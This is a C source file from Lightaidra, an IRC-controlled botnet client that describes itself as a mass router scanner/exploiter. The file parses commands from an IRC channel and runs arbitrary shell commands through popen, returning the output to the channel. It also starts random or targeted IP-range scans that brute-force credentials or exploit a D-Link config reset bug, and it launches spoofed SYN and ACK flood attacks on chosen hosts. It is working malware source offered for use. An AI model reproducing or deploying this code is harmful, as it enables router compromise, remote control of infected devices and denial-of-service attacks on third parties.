/*
 * requests.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

int cmd_init(sock_t *sp);
int cmd_ping(sock_t *sp);
void cmd_login(sock_t *sp, requests_t *req);
void cmd_logout(sock_t *sp, requests_t *req);
void cmd_exec(sock_t *sp, requests_t *req, char *token);
void cmd_version(sock_t *sp);
void cmd_status(sock_t *sp);
void cmd_help(sock_t *sp);
void cmd_setchan(sock_t *sp, requests_t *req);
void cmd_stop(sock_t *sp);
void cmd_join(sock_t *sp, requests_t *req);
void cmd_part(sock_t *sp, requests_t *req);
void cmd_quit(sock_t *sp, requests_t *req);
int cmd_advscan_random(sock_t *sp, requests_t *req, int t);
int cmd_advscan_recursive(sock_t *sp, requests_t *req);
int cmd_advscan(sock_t *sp, requests_t *req);
int login_control(requests_t *req);
int twordcmp(const char *s, requests_t *req);
int wordcmp(const char *s, requests_t *req);
int wordcmpp(const char *s, requests_t *req);
int sockwrite(int sd, const char *fmt, ...);
int login(sock_t *sp, requests_t *req);
int parse_input_errors(sock_t *sp, requests_t *req, 
unsigned short argn, unsigned short et);
int getextip(sock_t *sp, requests_t *req);
unsigned int host2ip(char *hostname);
void cmd_spoof(sock_t *sp, requests_t *req);
int packeting(sock_t *sp, unsigned int dest_addr,
    unsigned short dest_port, int ntime);
void cmd_scan_central(sock_t *sp, requests_t *req, 
    unsigned short type);

int pub_requests(sock_t *sp, requests_t *req) {
    token = strtok(netbuf, "\n");
   
    while (token != NULL) {
        memset(req->rcv_sb, 0, sizeof req->rcv_sb);
        memset(req->rcv_sc, 0, sizeof req->rcv_sc);
        memset(req->rcv_sd, 0, sizeof req->rcv_sd);
        memset(req->rcv_se, 0, sizeof req->rcv_se);

        sscanf(token, "%127s%31s%31s%31s%31s%31s%31s%31s",
               req->rcv_a, req->rcv_b, req->rcv_c,
               req->rcv_sa, req->rcv_sb, req->rcv_sc, req->rcv_sd,
               req->rcv_se);

        if (! strncmp(req->rcv_b, "433", strlen(req->rcv_b))) {
            getrstr();
            if (sockwrite(sp->sockfd, "NICK %s\n", data_ptr)) return EXIT_FAILURE;
        } 
        else if (! strncmp(req->rcv_b, "001", strlen(req->rcv_b))) {
            if (cmd_init(sp) == false) return EXIT_FAILURE;
        } 
        else if (! strncmp(req->rcv_b, "332", strlen(req->rcv_b))) {
            if (max_pids == 0 &&  stop == 0) {
                if (!twordcmp(":.advscan->recursive", req)) {
                    cmd_advscan_recursive(sp, req);
                } 
                else if (!twordcmp(":.advscan->random->b", req)) {
                    cmd_advscan_random(sp, req, 1);
                } 
                else if (!twordcmp(":.advscan->random", req)) {
                    cmd_advscan_random(sp, req, 0);
                }
            }
        } 
        else if (! strncmp(req->rcv_a, "PING", strlen(req->rcv_a))) {
            cmd_ping(sp);
        } 
        else if (! strncmp(req->rcv_b, "PRIVMSG", strlen(req->rcv_b))) {
            if (! wordcmp(":.login", req)) cmd_login(sp, req);

            if (login_control(req) == EXIT_SUCCESS && login_status == true) {
                if (! wordcmp(":.logout", req)) cmd_logout(sp, req);
                else if (! wordcmp(":.exec", req)) cmd_exec(sp, req, token);
                else if (! wordcmp(":.version", req)) cmd_version(sp);
                else if (! wordcmp(":.status", req)) cmd_status(sp);
                else if (! wordcmp(":.help", req)) cmd_help(sp);
                else if (! wordcmp(":.spoof", req)) cmd_spoof(sp, req);
                else if (! wordcmp(":.advscan->recursive", req)) {
                    if (!max_pids) {
                        stop = 0;
                        cmd_advscan_recursive(sp, req);
                    } 
                    else {
                        if (all_messages) 
                            sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                } 
                else if (! wordcmp(":.advscan->random->b", req)) {
                    if (!max_pids) {
                        stop = 0;
                        cmd_advscan_random(sp, req, 1);
                    } else {
                        if (all_messages)
                            sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                } 
                else if (! wordcmp(":.advscan->random", req)) {
                    if (!max_pids) {
                        stop = 0;
                        cmd_advscan_random(sp, req, 0);
                    } 
                    else {
                        if (all_messages)
                            sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                } 
                else if (! wordcmp(":.advscan", req)) {
                    if (!max_pids) {
                        stop = 0;
                        cmd_advscan(sp, req);
                    } 
                    else {
                        if (all_messages)
                            sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                } 
                else if (! wordcmp(":.stop", req)) cmd_stop(sp);
                else if (
                        ! wordcmp(":.synflood", req)   ||
                        ! wordcmp(":.ngsynflood", req) ||
                        ! wordcmp(":.ackflood", req)   ||
                        ! wordcmp(":.ngackflood", req)) {
                    if (!max_pids) {
                        stop = 0;
                        cmd_packeting(sp, req);
                    } 
                    else {
                        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                }
                else if (
                        ! wordcmpp(":.synflood->", req)   ||
                        ! wordcmpp(":.ngsynflood->", req) ||
                        ! wordcmpp(":.ackflood->", req)   ||
                        ! wordcmpp(":.ngackflood->", req)) {
                    if (!max_pids) {
                        if (strstr(req->rcv_sa, nctype)) {
                            stop = 0;
                            cmd_packeting(sp, req);
                        }
                    } 
                    else {
                        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[block] already working on %s\n", channel, status_temp);
                    }
                }
                else if (! wordcmp(":.setchan", req)) cmd_setchan(sp, req);
                else if (! wordcmp(":.join", req))    cmd_join(sp, req);
                else if (! wordcmp(":.part", req))    cmd_part(sp, req);
                else if (! wordcmp(":.quit", req))    cmd_quit(sp, req);
            }
        }

        token = strtok(NULL, "\n");
    }

    return EXIT_SUCCESS;
}

/* cmd_help(sock_t *) */ 
/* show help message.  */ 
void cmd_help(sock_t *sp) {
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** Access Commands:\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .login                <password>        - login to bot's party-line\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .logout                                 - logout from bot's party-line\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** Miscs Commands\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .exec                 <commands>        - execute a system command\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .version                                - show the current version of bot\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .status                                 - show the status of bot\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .help                                   - show this help message\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** Scan Commands\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan <a> <b>      <user> <passwd>   - scan with user:pass (A.B) classes sets by you\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan <a> <b>                        - scan with d-link config reset bug\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->recursive   <user> <pass>     - scan local ip range with user:pass, (C.D) classes random\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->recursive                     - scan local ip range with d-link config reset bug\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->random      <user> <pass>     - scan random ip range with user:pass, (A.B) classes random\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->random                        - scan random ip range with d-link config reset bug\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->random->b   <user> <pass>     - scan local ip range with user:pass, A.(B) class random\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .advscan->random->b                     - scan local ip range with d-link config reset bug\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .stop                                   - stop current operation (scan/dos)\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** DDos Commands:\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* NOTE: <port> to 0 = random ports, <ip> to 0 = random spoofing,\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* use .*flood->[m,a,p,s,x] for selected ddos, example: .ngackflood->s host port secs\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* where: *=syn,ngsyn,ack,ngack m=mipsel a=arm p=ppc s=superh x=x86\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .spoof          <ip>                    - set the source address ip spoof\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .synflood       <host> <port> <secs>    - tcp syn flooder\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .ngsynflood     <host> <port> <secs>    - tcp ngsyn flooder (new generation)\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .ackflood       <host> <port> <secs>    - tcp ack flooder\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .ngackflood     <host> <port> <secs>    - tcp ngack flooder (new generation)\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** IRC Commands:\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .setchan        <channel>               - set new master channel\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .join           <channel> <password>    - join bot in selected room\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .part           <channel>               - part bot from selected room\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* .quit                                   - kill the current process\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :*\n", channel);
    sockwrite(sp->sockfd, "PRIVMSG %s :* *** EOF\n", channel);

    return;
}

void sigkill() {
    exit(EXIT_SUCCESS);
}

/* cmd_join(sock_t *) */ 
/* join channel after connect. */ 
int cmd_init(sock_t *sp) {
    if (sockwrite(sp->sockfd, "JOIN %s :%s\n", channel, irc_chankey))
        return EXIT_FAILURE;

    return EXIT_SUCCESS;
}

/* cmd_ping(sock_t *) */ 
/* reply PING with PONG. */ 
int cmd_ping(sock_t *sp) {
    if (sockwrite(sp->sockfd, "PING 0313370\n"))
        return EXIT_FAILURE;

    return EXIT_SUCCESS;
}

/* cmd_login(sock_t *, requests_t *) */ 
/* log in the party-line bot.  */ 
void cmd_login(sock_t *sp, requests_t * req) {
    if (login_status) {
        if (login(sp, req) == true) login_status = true;
    }

    return;
}

/* cmd_logout(sock_t *, requests_t *) */ 
/* log out from party-line bot.  */ 
void cmd_logout(sock_t *sp, requests_t *req) {
    if (sockwrite(sp->sockfd, "PRIVMSG %s :[logout] you are logged out!, (%s).\n", channel, req->rcv_a + 1))
        return;

    login_status = false;
    return;
}

/* cmd_exec(sock_t *, requests_t *, *) */ 
/* execute a system command.  */ 
void cmd_exec(sock_t *sp, requests_t *req, char *token) {
    FILE *fd;
    char e_cmd[256], e_cmd_back[256];
    unsigned short lens = 0;

    sscanf(token, "%*s%*s%*s%*s%255[^\n]", e_cmd);
    lens = strlen(e_cmd);

    if (lens < 3) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[!exec] error on command: %s\n", 
        channel, "(NULL)");
        return;
    }

    e_cmd[lens - 1] = 0;
    fd = popen(e_cmd + 1, "r");

    if (fd == NULL) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[!exec] error on command: %s\n", 
        channel, "(NULL)");
        return;
    }

    sockwrite(sp->sockfd, "PRIVMSG %s :[exec] result of \"%s\":\n", 
    channel, e_cmd + 1);

    while (fgets(e_cmd_back, sizeof(e_cmd_back) - 1, fd) != NULL)
        sockwrite(sp->sockfd, "PRIVMSG %s :%s\n", channel, e_cmd_back);

    pclose(fd);
    return;
}

/* cmd_version(sock_t *) */ 
/* show the current version of Aidra. */ 
void cmd_version(sock_t *sp) {
    sockwrite(sp->sockfd, "PRIVMSG %s :[version] lightaidra 0x2012.\n", channel);
    return;
}

/* cmd_status(sock_t * sp) */
/* show the current status */
void cmd_status(sock_t *sp) {
    if (!max_pids) sockwrite(sp->sockfd, "PRIVMSG %s :[status] currently not working.\n", channel);
    else sockwrite(sp->sockfd, "PRIVMSG %s :[status] working on %s\n", channel, status_temp);
    
    return;
}

/* cmd_spoof(sock_t *, requests_t *) */
/* set an address for ip spoofing */
void cmd_spoof(sock_t *sp, requests_t *req) {
    if (parse_input_errors(sp, req, 1, 0)) return;

    if (!strncmp(req->rcv_sb, "0", 1)) {
        srchost = 0;
        sockwrite(sp->sockfd, "PRIVMSG %s :[spoof] spoofing set as random ip!\n", channel);
        return;
    }
    
    if (strlen(req->rcv_sb) < 7 || strlen(req->rcv_sb) > 15) {  
        sockwrite(sp->sockfd, "PRIVMSG %s :[error] one error in your input data, see help!\n", channel);
        return;
    } 
    else {
        srchost = (unsigned int)host2ip(req->rcv_sb);
        sockwrite(sp->sockfd, "PRIVMSG %s :[spoof] spoofing set as ip: %s\n", channel, req->rcv_sb);
        return;
    }

    return;
}

/* cmd_advscan(sock_t *, requests_t *) */ 
/* start the advance scanner.  */ 
int cmd_advscan(sock_t *sp, requests_t *req) {
    if (strlen(req->rcv_sb) < 1) return EXIT_FAILURE;

    /* check for input errors */
    if (strlen(req->rcv_se)) {
        if (parse_input_errors(sp, req, 4, 1))
            return EXIT_FAILURE;
    } 
    else {
        if (parse_input_errors(sp, req, 2, 0)) return EXIT_FAILURE;
        else if (parse_input_errors(sp, req, 2, 1)) return EXIT_FAILURE;
    }

    if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
        snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16 (user:%s pass:%s)", 
        req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
    } 
    else {
        snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16", 
        req->rcv_sb, req->rcv_sc);
    }

    max_pids = 1;
    pid = fork();

    if (!pid) {
        signal(SIGKILL, sigkill);
        if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
            sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16 (user:%s pass:%s), wait..\n", 
            channel, req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
            cmd_scan_central(sp, req, 1);
        } 
        else {
            sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16, wait..\n",
            channel, req->rcv_sb, req->rcv_sc);
            cmd_scan_central(sp, req, 2);
        }
    }
    else {
        g_pid = pid;
    }

    return EXIT_SUCCESS;
}

/* cmd_advscan_recursive(sock_t *, requests_t *) */ 
/* start the advance scanner in advscanrcs mode. */ 
int cmd_advscan_recursive(sock_t *sp, requests_t *req) {
    if (strcmp(req->rcv_sb, ":.advscan->recursive") == 0) {
        if (strlen(req->rcv_sc) && strlen(req->rcv_sd)) {
            memset(req->rcv_sb, 0, sizeof(req->rcv_sb));
    
            if (parse_input_errors(sp, req, 3, 1)) return EXIT_FAILURE;
            
            snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sd);
            snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sc);
        }
    } 
    else if (strlen(req->rcv_sb) && strlen(req->rcv_sc)) {
        snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sc);
        snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sb);
        
        if (parse_input_errors(sp, req, 2, 1)) return EXIT_FAILURE;
        
        memset(req->rcv_sb, 0, sizeof req->rcv_sb);
    }

    if (getextip(sp, req) == true) {
        if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
            snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16 (user:%s pass:%s)", 
            req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
        } 
        else {
            snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16", 
            req->rcv_sb, req->rcv_sc);
        }

        max_pids = 1;
        pid = fork();

        if (!pid) {
            if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
                sockwrite(sp->sockfd, 
                "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16 (user:%s pass:%s), wait..\n", 
                channel, req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
                cmd_scan_central(sp, req, 1);
            } 
            else {
                sockwrite(sp->sockfd,
                "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16. wait..\n", 
                channel, req->rcv_sb, req->rcv_sc);
                cmd_scan_central(sp, req, 2);
            }
        } 
        else {
            g_pid = pid;
        }
    } 

    return EXIT_SUCCESS;
}

/* cmd_advscan_random(sock_t *, requests_t *) */ 
/* start the advance scanner in x.B.x.x random mode. */ 
int cmd_advscan_random(sock_t *sp, requests_t *req, int t) {
    /* check for input errors */
    if (!strcmp(req->rcv_sb, ":.advscan->random") ||
        !strcmp(req->rcv_sb, ":.advscan->random->b")) {
        
        if (strlen(req->rcv_sc) && strlen(req->rcv_sd)) {
            memset(req->rcv_sb, 0, sizeof(req->rcv_sb));
            
            if (parse_input_errors(sp, req, 3, 1)) return EXIT_FAILURE;;
            
            snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sd);
            snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sc);
        }
    }
    else if (strlen(req->rcv_sb) && strlen(req->rcv_sc)) {
        snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sc);
        snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sb);
    
        if (parse_input_errors(sp, req, 2, 1)) return EXIT_FAILURE;
    
        memset(req->rcv_sb, 0, sizeof req->rcv_sb);
    }

    srand((unsigned int)time(NULL));
    random_ct = rand();
    random_num = ((random_ct % 254) + 1);

    if (!t) {
        if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
            snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16 (user:%s pass:%s)", 
            req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
        } 
        else {
            snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16", 
            req->rcv_sb, req->rcv_sc);
        }

        max_pids = 1;
        pid = fork();
    
        if (!pid) {
            snprintf(req->rcv_sb, sizeof(req->rcv_sb), "%u", random_num);
            sleep(1);
            
            random_ct = rand();
            random_num = ((random_ct % 254) + 1);
            snprintf(req->rcv_sc, sizeof(req->rcv_sc), "%u", random_num);

            if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16 (user:%s pass:%s). wait..\n", 
                channel, req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
                cmd_scan_central(sp, req, 1);
            } 
            else {
                sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16. wait..\n", 
                channel, req->rcv_sb, req->rcv_sc);
                cmd_scan_central(sp, req, 2);
            }
        }
        else {
            g_pid = pid;
        }
    }
    else {
        if (!getextip(sp, req)) {
            if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
                snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16 (user:%s pass:%s)", 
                req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
            } 
            else {
                snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16", 
                req->rcv_sb, req->rcv_sc);
            }

            max_pids = 1;
            pid = fork();

            if (!pid) {
                snprintf(req->rcv_sc, sizeof(req->rcv_sc), "%u", random_num);
    
                if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
                    sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16 (user:%s pass:%s). wait..\n", channel,
                    req->rcv_sb, req->rcv_sc,
                    req->rcv_sd, req->rcv_se);
                    cmd_scan_central(sp, req, 1);
                } 
                else {
                    sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16. wait..\n", channel,
                    req->rcv_sb, req->rcv_sc);
                    cmd_scan_central(sp, req, 2);
                }
            } 
            else {
                g_pid = pid;
            }
        }
        else {
            if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to get local ip, switching to random scan..\n", channel);
            cmd_advscan_random(sp, req, 0);         
        }
    }

    return EXIT_SUCCESS;
}

/* cmd_stop(sock_t *) */ 
/* stop the current working. */ 
void cmd_stop(sock_t *sp) {
    if (max_pids > 0) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[stop] %s was stopped!\n", channel, "operation");
        stop = 1;
        max_pids = 0;
        kill(g_pid, 9);
        sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    }

    return;
}

/* cmd_setchan(sock_t *, requests_t *) */ 
/* set new channel master.  */ 
void cmd_setchan(sock_t *sp, requests_t *req) {
    if (strlen(req->rcv_sb) > 1) {
        snprintf(channel, sizeof(channel)-1, "%s", req->rcv_sb);
        sockwrite(sp->sockfd, "PRIVMSG %s :[chan] %s setted as master channel.\n", channel, req->rcv_sb);
    }

    return;
}

/* cmd_join(sock_t *, requests_t *) */ 
/* join bot in some channel.  */ 
void cmd_join(sock_t *sp, requests_t *req) {
    if (strlen(req->rcv_sb) > 0) {
        stop = 0;
        sockwrite(sp->sockfd, "JOIN %s :%s\n", req->rcv_sb, req->rcv_sc);
    }

    return;
}

/* cmd_part(sock_t *, requests_t *) */ 
/* part bot from some channel.  */ 
void cmd_part(sock_t *sp, requests_t *req) {
    if (strlen(req->rcv_sb) > 0) sockwrite(sp->sockfd, "PART %s :%s\n", req->rcv_sb, "Aidra?!");
    return;
}

/* cmd_quit(sock_t *, requests_t *) */ 
/* quit from irc and kill current process. */ 
void cmd_quit(sock_t *sp, requests_t *req) {
    sockwrite(sp->sockfd, "QUIT :pwn!\n");

    if (max_pids > 0) {
        fclose(resfd);
        kill(g_pid, 9);
    }

    free(sp);
    free(req);
    kill(0, 9);
    exit(EXIT_SUCCESS);
}

/* *cmd_synflood(sock_t *, requests_t *) */ 
/* start synflood attack.  */ 
int cmd_packeting(sock_t *sp, requests_t *req) {
    if (strlen(req->rcv_sb) < 1) return EXIT_FAILURE;

    if (parse_input_errors(sp, req, 3, 0)) return EXIT_FAILURE;

    max_pids = 1;
    pid = fork();

    if (!pid) {
        dsthost = host2ip(req->rcv_sb);
        uport = atoi(req->rcv_sc);
        useconds = atoi(req->rcv_sd);

        if (strstr(req->rcv_sa, ":.synflood")) {
            snprintf(status_temp, sizeof(status_temp), "synflood packeting %s:%u (secs: %u)", req->rcv_sb, uport, useconds);
            sockwrite(sp->sockfd, "PRIVMSG %s :[synflood] start packeting: %s:%u (secs: %u).\n", channel, req->rcv_sb, uport, useconds);
            synflood(sp, dsthost, uport, useconds);
        } 
        else if (strstr(req->rcv_sa, ":.ngsynflood")) {
            snprintf(status_temp, sizeof(status_temp), "ngsynflood packeting %s:%u (secs: %u)",  req->rcv_sb, uport, useconds);
            sockwrite(sp->sockfd, "PRIVMSG %s :[ngsynflood] start packeting: %s:%u (secs: %u).\n", channel, req->rcv_sb, uport, useconds);
            ngsynflood(sp, dsthost, uport, useconds);
        } 
        else if (strstr(req->rcv_sa, ":.ackflood")) {
            snprintf(status_temp, sizeof(status_temp), "ackflood packeting %s:%u (secs: %u)", req->rcv_sb, uport, useconds);
            sockwrite(sp->sockfd, "PRIVMSG %s :[ackflood] start packeting: %s:%u (secs: %u).\n", channel, req->rcv_sb, uport, useconds);
            ackflood(sp, dsthost, uport, useconds);
        } 
        else if (strstr(req->rcv_sa, ":.ngackflood")) {
            snprintf(status_temp, sizeof(status_temp), "ngackflood packeting %s:%u (secs: %u)", req->rcv_sb, uport, useconds);
            sockwrite(sp->sockfd, "PRIVMSG %s :[ngackflood] start packeting: %s:%u (secs: %u).\n", channel, req->rcv_sb, uport, useconds);
            ngackflood(sp, dsthost, uport, useconds);
        }
    }
    else {
        g_pid = pid;
    }

    return EXIT_SUCCESS;
}

